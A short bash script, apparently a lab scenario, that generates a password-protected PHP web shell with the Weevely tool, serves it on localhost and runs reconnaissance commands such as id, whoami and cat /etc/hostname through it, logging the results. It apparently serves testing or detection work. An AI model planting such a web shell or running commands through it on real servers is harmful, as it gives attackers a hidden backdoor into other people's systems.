#!/bin/bash
set +e
OUT="${OUT:-/lab/src/out}"
mkdir -p "$OUT" /tmp/www

export PYTHONPATH=/lab/bin/tools/weevely/src
WV="python3 -c \"from weevely.main import cli; import sys; sys.exit(cli())\""

eval $WV generate testpass /tmp/www/shell.php > "$OUT/weevely.log" 2>&1
cd /tmp/www && php -S 127.0.0.1:8080 > "$OUT/php.log" 2>&1 &
PHP=$!
sleep 2

for cmd in "id" "whoami" "uname -a" "pwd" "ls /tmp" "cat /etc/hostname"; do
  eval $WV http://127.0.0.1:8080/shell.php testpass "$cmd" >> "$OUT/weevely.log" 2>&1
  sleep 3
done

kill "$PHP" 2>/dev/null
echo "weevely scenario done" >> "$OUT/weevely.log"
exit 0
